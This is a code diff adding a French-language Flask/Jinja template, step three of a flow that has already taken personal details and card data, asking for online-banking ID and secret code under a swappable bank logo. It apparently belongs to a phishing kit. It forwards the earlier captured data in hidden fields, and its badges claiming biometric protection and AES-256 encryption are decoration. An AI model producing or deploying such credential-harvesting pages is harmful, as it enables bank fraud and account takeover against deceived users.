@@ -1,0 +1,117 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="bank-auth-container">
+    <div class="auth-progress">
+        <div class="step completed">
+            <i class="fas fa-check"></i>
+            <p>Coordonnées</p>
+        </div>
+        <div class="step completed">
+            <i class="fas fa-check"></i>
+            <p>Carte</p>
+        </div>
+        <div class="step active">
+            <span>3</span>
+            <p>Connexion</p>
+        </div>
+    </div>
+
+    <div class="bank-auth-header">
+        <div class="bank-logo-display">
+            <img src="{{ bank_logo }}" alt="Logo Banque" class="bank-logo">
+            <div class="secure-badge">
+                <i class="fas fa-lock"></i>
+                <span>Connexion Sécurisée</span>
+            </div>
+        </div>
+        <h1>Authentification Requise</h1>
+        <p>Veuillez vous connecter à votre espace bancaire</p>
+    </div>
+
+    <form id="bank-auth-form" action="{{ url_for('installment_confirmation') }}" method="POST">
+        <input type="hidden" name="step1_data" value="{{ step1_data }}">
+        <input type="hidden" name="step2_data" value="{{ step2_data }}">
+
+        <div class="auth-form-group">
+            <label for="bank-user-id">Identifiant Client</label>
+            <div class="input-with-icon">
+                <i class="fas fa-user-shield"></i>
+                <input type="text" id="bank-user-id" name="bank_user_id" required 
+                       placeholder="Votre identifiant bancaire" pattern="[A-Za-z0-9]{8,12}">
+            </div>
+        </div>
+
+        <div class="auth-form-group">
+            <label for="bank-password">Code Secret</label>
+            <div class="password-input-container">
+                <div class="input-with-icon">
+                    <i class="fas fa-key"></i>
+                    <input type="password" id="bank-password" name="bank_password" required
+                           placeholder="••••••••" readonly
+                           onfocus="this.removeAttribute('readonly')">
+                </div>
+                <div class="virtual-keyboard-container">
+                    <div class="keyboard-disclaimer">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Clavier Sécurisé - Anti-espionnage</span>
+                    </div>
+                    <div class="virtual-keyboard">
+                        <div class="keyboard-row">
+                            <button type="button" class="key-btn" data-value="1">1</button>
+                            <button type="button" class="key-btn" data-value="2">2</button>
+                            <button type="button" class="key-btn" data-value="3">3</button>
+                        </div>
+                        <div class="keyboard-row">
+                            <button type="button" class="key-btn" data-value="4">4</button>
+                            <button type="button" class="key-btn" data-value="5">5</button>
+                            <button type="button" class="key-btn" data-value="6">6</button>
+                        </div>
+                        <div class="keyboard-row">
+                            <button type="button" class="key-btn" data-value="7">7</button>
+                            <button type="button" class="key-btn" data-value="8">8</button>
+                            <button type="button" class="key-btn" data-value="9">9</button>
+                        </div>
+                        <div class="keyboard-row">
+                            <button type="button" class="key-btn special" data-value=".">.</button>
+                            <button type="button" class="key-btn" data-value="0">0</button>
+                            <button type="button" class="key-btn special" data-action="backspace">
+                                <i class="fas fa-backspace"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="auth-actions">
+            <button type="button" class="btn-back" onclick="history.back()">
+                <i class="fas fa-chevron-left"></i> Retour
+            </button>
+            <button type="submit" class="btn-auth-submit">
+                <span>Valider</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+
+        <div class="security-features">
+            <div class="security-item">
+                <i class="fas fa-fingerprint"></i>
+                <span>Protection biométrique</span>
+            </div>
+            <div class="security-item">
+                <i class="fas fa-lock"></i>
+                <span>Chiffrement AES-256</span>
+            </div>
+        </div>
+    </form>
+</div>
+{% endblock %}
+
+{% block extra_css %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/bank_auth.css') }}">
+{% endblock %}
+
+{% block extra_js %}
+<script src="{{ url_for('static', filename='js/bank_auth.js') }}"></script>
+{% endblock %}
